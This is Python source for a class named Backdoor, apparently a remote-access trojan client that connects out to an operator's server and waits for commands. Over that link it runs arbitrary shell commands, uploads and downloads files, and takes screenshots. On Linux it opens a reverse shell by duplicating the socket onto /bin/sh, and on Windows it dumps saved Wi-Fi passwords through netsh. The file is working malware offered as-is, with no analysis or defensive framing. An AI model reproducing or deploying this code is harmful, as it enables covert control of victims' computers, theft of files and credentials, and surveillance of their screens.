import socket
import json
import os
import base64
from subprocess import check_output, run
from sys import platform
from PIL import ImageGrab
from threading import Thread
from re import findall
if platform == 'linux':
    from pty import spawn

class Backdoor:
    DISCONNECT = '!DISCONNECT'

    def __init__(self, server, port):
        self.server = server
        self.port = port
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        self.connection.connect((self.server, int(self.port)))

    def sender(self, message):
        message = json.dumps(message).encode()
        self.connection.send(message)

    def read_file(self, name):
        with open(name, 'rb') as fil:
            return base64.b64encode(fil.read()).decode()

    def write_file(self, content, name):
        content = base64.b64decode(content)
        with open(name, 'wb') as fil:
            fil.write(content)
        return 'UPLOADED'

    def receiver(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1020).decode()
                return json.loads(json_data)
            except ValueError:
                pass

    def window_wifi_pass(self):
        profiles = run('netsh wlan show profile', shell=True, capture_output=True).stdout.decode()
        profile_names = findall('All User Profile     : (.*)\r', profiles)
        content = dict()
        for i in profile_names:
            profile_info = run(f'netsh wlan show profile {i} key=clear', shell=True,
                               capture_output=True).stdout.decode()
            key = findall('Key Content            : (.*)\r', profile_info)
            try:
                key = key[0]
            except IndexError:
                key = key
            content[i] = key

        return content

    def spawn_pty(self, ip, port):
        s = socket.socket()
        s.connect((ip, port))
        [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
        spawn("/bin/sh")

    def run_command(self, command):
            split_commnad = command.split()
            try:
                if split_commnad[0] == 'cd': # CHANGING DIR
                    os.chdir(split_commnad[1])
                    result = os.getcwd()
                elif command == 'screenshot':
                    image = ImageGrab.grab()
                    image.save('screen.png')
                    result = self.read_file('screen.png')
                    os.remove('screen.png')
                elif split_commnad[0] == 'upload':
                    name = split_commnad[1]
                    content = split_commnad[2]
                    result = self.write_file(content=content, name=name)
                elif split_commnad[0] == 'download':
                    result = self.read_file(split_commnad[1])
                elif split_commnad[0] == 'tty':
                    if platform == 'linux':
                        ip = self.server
                        port = int(split_commnad[1])
                        t = Thread(target=self.spawn_pty, args=(ip,port))
                        t.start()
                        result = ''
                    else:
                        result = 'Not Linux system'
                elif split_commnad[0] == "ls" and len(split_commnad) == 1:
                    result = os.listdir()
                    result = '\n'.join(result)
                elif split_commnad[0] == 'cat' and len(split_commnad) == 2:
                    result = self.read_file(split_commnad[1])
                    result = base64.b64decode(result).decode()
                elif command == 'windows wifi':
                    if platform == 'win32':
                        result = self.window_wifi_pass()
                    else:
                        result = 'Not a windows machine'
                else:
                    result = check_output(command, shell=True).decode()
            except Exception as e:
                result = str(e)
            return result

